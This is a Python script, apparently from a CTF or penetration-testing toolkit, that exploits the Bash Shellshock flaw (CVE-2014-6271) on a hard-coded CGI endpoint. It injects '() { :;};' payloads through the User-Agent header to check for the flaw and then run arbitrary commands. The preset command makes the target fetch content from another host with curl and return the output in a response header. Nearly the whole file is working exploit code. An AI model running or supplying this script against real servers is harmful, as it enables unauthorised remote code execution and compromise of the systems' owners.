# -*- coding: utf-8 -*-
# Created by restran on 2016/10/18
from __future__ import unicode_literals, absolute_import
# Bash远程命令执行漏洞（CVE2014-6271）
import requests
import os
import sys
import logging

# 把项目的目录加入的环境变量中，这样才可以导入 common.base
sys.path.insert(1, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

logger = logging.getLogger(__name__)

target_url = 'http://10.50.24.2/cgi-bin/test-cgi'
cmd_tmp_file = '/tmp/1476802246.txt'
# 这里 curl 要使用绝对地址，python 可能也要，需要测试
cmd_code = '''
/usr/bin/curl http://10.10.1.252 > %s;
python -c "exec(r\"f=open('%s','rb');d=f.read().replace('\n',' ').replace('\r','');f.close();f=open('%s','wb');f.write(d)\")""
''' % (cmd_tmp_file, cmd_tmp_file, cmd_tmp_file)
cmd_code = cmd_code.replace('\n', '')
echo_cmd_code = '`cat %s`' % cmd_tmp_file


def detect(url):
    flag_text = 'bash_flag'
    shell_code = '() { :;};a=\'%s\';echo "a: $a"\' \''
    headers = {'User-Agent': shell_code % flag_text}
    r = requests.get(url, headers=headers, verify=False, timeout=10)
    if r.status_code == 200 and 'a' in r.headers and flag_text in r.headers['a']:
        return True

    return False


def exploit(url, cmd, echo_cmd):
    is_vul = detect(url)
    if is_vul:
        logger.info("[vulnerable] " + url)
        # echo 的地方才会输出，否则只是执行命令
        # 在 echo 的命令参数中 `shell code` 表示可以执行的 shell 命令
        # 会自动替换成运行结果的字符串
        shell_code = '() { :;};%s;a=`%s`;echo "a: $a"\' \''
        headers = {"User-Agent": shell_code % (cmd, echo_cmd)}
        r = requests.get(url, headers=headers, verify=False, timeout=10)
        if r.status_code == 200:
            logger.info(r.headers['a'])
            logger.info(r.content)
        else:
            logger.info("[Response Code] " + str(r.status_code))
            logger.info("[Tips] Cant Open the Url, Please Try Again!")
    else:
        logger.info("[may be not vulnerable] " + url)


def main():
    exploit(target_url, cmd_code, echo_cmd_code)


if __name__ == '__main__':
    main()
